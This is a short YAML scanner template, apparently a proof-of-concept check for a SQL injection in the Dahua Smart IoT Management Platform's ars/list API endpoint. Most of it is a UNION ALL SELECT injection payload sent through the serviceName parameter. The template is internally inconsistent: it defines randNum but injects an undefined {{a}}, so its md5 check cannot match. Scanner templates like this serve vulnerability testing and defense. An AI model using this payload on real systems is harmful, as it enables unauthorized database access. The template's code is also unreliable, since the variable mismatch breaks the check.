id: dahua-icc-servicename-sql-inject

info:
  name: 大华智能物联管理平台sql注入
  author: k5rC85Lma
  severity: high
  verified: true
  description: |-
    大华智能物联管理平台evo-apigw/evo-arsm/1.0.0/ars/list接口存在SQL注入漏洞。
  reference:
    - https://mp.weixin.qq.com/s/GbmIyGNB3Gd16n9RCCyPCg
  tags: dahua,sqli
  created: 2026/01/20

set:
  randNum: randomInt(1000,9999)
rules:
  r0:
    request:
      method: GET
      path: /evo-apigw/evo-arsm/1.0.0/ars/list?serviceName=%27+UNION+ALL+SELECT+NULL,NULL,NULL,CONCAT(0x7e,md5({{a}}),0x7e),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--+-
    expression: |
      response.status == 200 && response.body.bcontains(bytes(md5(string(randNum))))
expression: r0()
